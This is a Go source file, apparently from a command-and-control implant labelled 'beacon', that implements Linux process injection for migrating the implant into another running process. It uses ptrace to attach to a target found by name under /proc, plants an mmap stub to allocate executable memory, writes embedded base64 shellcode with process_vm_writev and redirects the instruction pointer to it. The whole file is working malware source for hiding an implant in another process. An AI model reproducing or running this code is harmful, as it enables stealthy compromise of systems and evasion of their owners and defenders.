//go:build linux

package core

import (
	"context"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

const (
	ptracePeekText = 1
	ptracePokeText = 4
	ptraceCont     = 7
	ptraceDetach   = 17
	ptraceAttach   = 16
	ptraceGetRegs  = 12
	ptraceSetRegs  = 13

	// ptracePeekData and ptracePokeData are the variants that
	// operate on data segments rather than text.
	ptracePeekData = 2
	ptracePokeData = 5

	waitAll = 0x00000000
)

// sysProcessVMWritev is the process_vm_writev(2) syscall number
// on x86_64. The Go stdlib does not export this constant from
// the syscall package on amd64, so it is declared here.

const sysProcessVMWritev = 311

type userRegs struct {
	R15      uint64
	R14      uint64
	R13      uint64
	R12      uint64
	Rbp      uint64
	Rbx      uint64
	R11      uint64
	R10      uint64
	R9       uint64
	R8       uint64
	Rax      uint64
	Rcx      uint64
	Rdx      uint64
	Rsi      uint64
	Rdi      uint64
	Orig_rax uint64
	Rip      uint64
	Cs       uint64
	Eflags   uint64
	Rsp      uint64
	Ss       uint64
	Fs_base  uint64
	Gs_base  uint64
	Ds       uint64
	Es       uint64
	Fs       uint64
	Gs       uint64
}

func ptrace(req uintptr, pid int, addr, data uintptr) error {
	_, _, errno := syscall.Syscall6(
		syscall.SYS_PTRACE,
		req,
		uintptr(pid),
		addr,
		data,
		0, 0)
	if errno != 0 {
		return errno
	}
	return nil
}

// injectInto performs ptrace-based injection of the embedded
// shellcode into the target PID.
//
//   1. PTRACE_ATTACH, wait for SIGSTOP
//   2. PTRACE_GETREGS, save the caller's registers
//   3. Write an mmap(RWX) syscall stub into the target's RIP
//   4. PTRACE_CONT, wait for the stub to complete
//   5. Read the mapped address out of RAX via PTRACE_GETREGS
//   6. Restore original RIP bytes
//   7. Write the shellcode via process_vm_writev
//   8. Set RIP to the shellcode entry, PTRACE_DETACH
//
// The shellcode is an ELF-loader stub prepended to the beacon
// ELF. See the note at the bottom of this file.
func injectInto(ctx context.Context, pid int, method string) (uint32, error) {
	if method != "" && method != "default" {
		return 0, fmt.Errorf(
			"migrate: method %q is Windows-only; Linux "+
				"supports only the default ptrace path",
			method)
	}
	shellcode, err := base64.StdEncoding.DecodeString(
		InjectorShellcodeB64)
	if err != nil {
		return 0, fmt.Errorf("decode shellcode: %w", err)
	}
	if len(shellcode) == 0 {
		return 0, errors.New("injector shellcode is empty")
	}

	if pid == os.Getpid() {
		return 0, errors.New(
			"cannot inject into self via ptrace; use " +
				"`migrate --self` for the detach-and-exec form")
	}

	if err := ptrace(ptraceAttach, pid, 0, 0); err != nil {
		return 0, fmt.Errorf("PTRACE_ATTACH: %v "+
			"(target may not be same-user, or may be "+
			"protected)", err)
	}
	detached := false
	defer func() {
		if !detached {
			_ = ptrace(ptraceDetach, pid, 0, 0)
		}
	}()

	if err := waitStopped(pid); err != nil {
		return 0, err
	}

	var saved userRegs
	if err := ptrace(ptraceGetRegs, pid, 0,
		uintptr(unsafe.Pointer(&saved))); err != nil {
		return 0, fmt.Errorf("PTRACE_GETREGS: %v", err)
	}

	origBytes, err := peekBytes(pid, uintptr(saved.Rip), 16)
	if err != nil {
		return 0, err
	}

	// The mmap stub. On x86_64 the Linux syscall ABI is:
	//
	//   rax = syscall number (9 for mmap)
	//   rdi = addr (0)
	//   rsi = length
	//   rdx = prot (PROT_READ|PROT_WRITE|PROT_EXEC = 0x7)
	//   r10 = flags (MAP_PRIVATE|MAP_ANONYMOUS = 0x22)
	//   r8  = fd (-1)
	//   r9  = offset (0)
	//
	// The stub loads these and executes `syscall` then `ret`.
	// 16 bytes is comfortable.
	stub := buildMmapStub(uint64(len(shellcode)))

	if err := pokeBytes(pid, uintptr(saved.Rip), stub); err != nil {
		return 0, err
	}

	regs := saved
	regs.Rax = 9 // __NR_mmap
	regs.Rdi = 0
	regs.Rsi = uint64(len(shellcode))
	regs.Rdx = 0x7  // PROT_READ|PROT_WRITE|PROT_EXEC
	regs.R10 = 0x22 // MAP_PRIVATE|MAP_ANONYMOUS
	regs.R8 = ^uint64(0) // fd = -1
	regs.R9 = 0

	if err := ptrace(ptraceSetRegs, pid, 0,
		uintptr(unsafe.Pointer(&regs))); err != nil {
		_ = pokeBytes(pid, uintptr(saved.Rip), origBytes)
		return 0, fmt.Errorf("PTRACE_SETREGS: %v", err)
	}

	if err := ptrace(ptraceCont, pid, 0, 0); err != nil {
		_ = pokeBytes(pid, uintptr(saved.Rip), origBytes)
		return 0, fmt.Errorf("PTRACE_CONT(mmap): %v", err)
	}
	if err := waitStopped(pid); err != nil {
		return 0, err
	}

	var afterMmap userRegs
	if err := ptrace(ptraceGetRegs, pid, 0,
		uintptr(unsafe.Pointer(&afterMmap))); err != nil {
		return 0, fmt.Errorf("PTRACE_GETREGS(mmap): %v", err)
	}
	mappedAddr := afterMmap.Rax

	if err := pokeBytes(pid, uintptr(saved.Rip), origBytes); err != nil {
		return 0, err
	}

	finalRegs := saved
	finalRegs.Rip = mappedAddr
	finalRegs.Rsp = saved.Rsp

	if err := writeProcessMemory(pid, uintptr(mappedAddr),
		shellcode); err != nil {
		return 0, fmt.Errorf("write shellcode: %v", err)
	}

	if err := ptrace(ptraceSetRegs, pid, 0,
		uintptr(unsafe.Pointer(&finalRegs))); err != nil {
		return 0, fmt.Errorf("PTRACE_SETREGS(final): %v", err)
	}

	if err := ptrace(ptraceDetach, pid, 0, 0); err != nil {
		return 0, fmt.Errorf("PTRACE_DETACH: %v", err)
	}
	detached = true

	diag("[beacon] inject pid %d: shellcode mapped at 0x%x, "+
		"%d bytes\n", pid, mappedAddr, len(shellcode))

	_ = ctx
	return 0, nil
}

// buildMmapStub emits the 16-byte sequence that performs an
// mmap with the register state we set up. Layout:
//
//   0F 05        syscall
//   C3           ret
//   (padding)
func buildMmapStub(length uint64) []byte {
	stub := make([]byte, 16)
	stub[0] = 0x0F // syscall
	stub[1] = 0x05
	stub[2] = 0xC3 // ret
	return stub
}

func peekBytes(pid int, addr uintptr, n int) ([]byte, error) {
	out := make([]byte, 0, n)
	for len(out) < n {
		var word uintptr
		if err := ptrace(ptracePeekData, pid, addr,
			uintptr(unsafe.Pointer(&word))); err != nil {
			return nil, fmt.Errorf("PTRACE_PEEKDATA at 0x%x: %v",
				addr, err)
		}
		buf := (*[unsafe.Sizeof(word)]byte)(unsafe.Pointer(&word))
		take := n - len(out)
		if take > len(buf) {
			take = len(buf)
		}
		out = append(out, buf[:take]...)
		addr += uintptr(len(buf))
	}
	return out, nil
}

func pokeBytes(pid int, addr uintptr, data []byte) error {
	i := 0
	for i+8 <= len(data) {
		word := binary.LittleEndian.Uint64(data[i : i+8])
		if err := ptrace(ptracePokeData, pid, addr,
			uintptr(word)); err != nil {
			return fmt.Errorf("PTRACE_POKEDATA at 0x%x: %v",
				addr, err)
		}
		i += 8
		addr += 8
	}
	if i < len(data) {
		var word uintptr
		if err := ptrace(ptracePeekData, pid, addr,
			uintptr(unsafe.Pointer(&word))); err != nil {
			return fmt.Errorf("PTRACE_PEEKDATA at 0x%x: %v",
				addr, err)
		}
		buf := (*[8]byte)(unsafe.Pointer(&word))
		copy(buf[:], data[i:])
		if err := ptrace(ptracePokeData, pid, addr,
			uintptr(word)); err != nil {
			return fmt.Errorf("PTRACE_POKEDATA at 0x%x: %v",
				addr, err)
		}
	}
	return nil
}

func writeProcessMemory(pid int, addr uintptr, data []byte) error {
	local := syscall.Iovec{
		Base: &data[0],
		Len:  uint64(len(data)),
	}
	remote := syscall.Iovec{
		Base: (*byte)(unsafe.Pointer(addr)),
		Len:  uint64(len(data)),
	}
	n, _, errno := syscall.Syscall6(
		sysProcessVMWritev,
		uintptr(pid),
		uintptr(unsafe.Pointer(&local)),
		1,
		uintptr(unsafe.Pointer(&remote)),
		1,
		0)
	if errno != 0 {
		return errno
	}
	if int(n) != len(data) {
		return fmt.Errorf("short write %d/%d", n, len(data))
	}
	return nil
}

func waitStopped(pid int) error {
	for {
		var status syscall.WaitStatus
		_, err := syscall.Wait4(pid, &status, waitAll, nil)
		if err != nil {
			return fmt.Errorf("wait4: %v", err)
		}
		if status.Stopped() {
			return nil
		}
		if status.Exited() {
			return errors.New("target exited during injection")
		}
	}
}

func findProcessByName(name string) (int, error) {
	name = filepath.Base(name)
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return 0, fmt.Errorf("read /proc: %v", err)
	}
	for _, e := range entries {
		pid, err := atoiSafe(e.Name())
		if err != nil {
			continue
		}
		link, err := os.Readlink(fmt.Sprintf(
			"/proc/%d/exe", pid))
		if err != nil {
			continue
		}
		base := filepath.Base(link)
		base = strings.TrimSuffix(base, " (deleted)")
		if base == name {
			return pid, nil
		}
	}
	return 0, fmt.Errorf(
		"migrate: no running process named %q", name)
}

func atoiSafe(s string) (int, error) {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			return 0, errors.New("not a number")
		}
		n = n*10 + int(c-'0')
	}
	return n, nil
}